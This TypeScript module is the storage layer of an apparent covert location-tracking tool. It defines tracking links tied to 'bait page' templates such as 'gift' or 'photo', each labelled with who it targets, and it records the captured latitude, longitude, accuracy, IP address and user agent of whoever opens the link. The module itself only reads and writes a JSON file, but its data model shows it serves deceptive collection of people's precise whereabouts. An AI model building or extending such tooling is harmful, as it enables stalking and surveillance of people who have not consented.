import fs from 'fs';
import path from 'path';

export interface TrackingLink {
    id: string; // The short code (e.g. nanoid)
    label: string; // Name given by user to remember who this is for
    template: string; // The bait page template (e.g. 'gift', 'photo', 'article')
    createdAt: string; // ISO timestamp
}

export interface LocationCapture {
    linkId: string;
    lat: number;
    lng: number;
    accuracy: number;
    timestamp: string; // ISO timestamp
    userAgent: string;
    ip: string;
}

export interface TrackingData {
    links: TrackingLink[];
    captures: LocationCapture[];
}

const dataFilePath = path.join(process.cwd(), 'data', 'tracking.json');

// Helper to read data
export function getTrackingData(): TrackingData {
    try {
        if (!fs.existsSync(dataFilePath)) {
            // Ensure directory exists
            const dir = path.dirname(dataFilePath);
            if (!fs.existsSync(dir)) {
                fs.mkdirSync(dir, { recursive: true });
            }
            const initialData: TrackingData = { links: [], captures: [] };
            fs.writeFileSync(dataFilePath, JSON.stringify(initialData, null, 2));
            return initialData;
        }
        const fileContents = fs.readFileSync(dataFilePath, 'utf8');
        return JSON.parse(fileContents) as TrackingData;
    } catch (error) {
        console.error('Error reading tracking data:', error);
        return { links: [], captures: [] };
    }
}

// Helper to write data
export function saveTrackingData(data: TrackingData): boolean {
    try {
        fs.writeFileSync(dataFilePath, JSON.stringify(data, null, 2));
        return true;
    } catch (error) {
        console.error('Error writing tracking data:', error);
        return false;
    }
}

export function addTrackingLink(link: TrackingLink): TrackingData {
    const data = getTrackingData();
    data.links.push(link);
    saveTrackingData(data);
    return data;
}

export function addLocationCapture(capture: LocationCapture): TrackingData {
    const data = getTrackingData();
    data.captures.push(capture);
    saveTrackingData(data);
    return data;
}
